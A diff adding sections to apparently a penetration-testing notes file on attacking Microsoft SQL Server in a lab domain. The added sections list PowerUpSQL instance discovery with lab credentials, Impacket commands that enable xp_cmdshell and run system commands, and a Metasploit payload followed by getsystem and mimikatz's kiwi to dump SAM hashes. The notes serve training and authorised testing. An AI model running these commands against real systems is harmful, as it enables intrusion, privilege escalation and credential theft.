@@ -449,6 +449,41 @@ EXEC xp_cmdshell 'whoami';
 
 If the SQL service account holds `SeImpersonate`, this is a free path to SYSTEM via Potato attacks — see [Windows Privesc → SeImpersonate](../4-post-exploitation/02-windows-privilege-escalation.md).
 
+#### PowerUpSQL (from a domain-joined Windows host)
+
+```bash
+Import-Module .\PowerUpSQL.ps1
+
+## Find every SQL instance in the domain
+Get-SQLInstanceDomain
+
+## Run a query against a specific instance with windows auth
+Get-SQLQuery -Verbose -Instance "172.16.5.150,1433" `
+    -username "inlanefreight\damundsen" -password "SQL1234!" \
+    -query 'Select @@version'
+```
+
+#### MSSQL via Impacket → Windows shell (Kali to Windows)
+
+```bash
+mssqlclient.py INLANEFREIGHT/DAMUNDSEN@172.16.5.150 -windows-auth
+enable_xp_cmdshell
+xp_cmdshell whoami /priv
+```
+
+#### MSSQL via Metasploit → Meterpreter + kiwi
+
+```bash
+use exploit/windows/mssql/mssql_payload
+## set RHOSTS / RPORT / CMSHELL options / USERNAME / PASSWORD
+run
+
+## In meterpreter, try to escalate then load kiwi (mimikatz):
+getsystem
+load kiwi
+lsa_dump_sam
+```
+
 #### Read Files
 
 ```sql
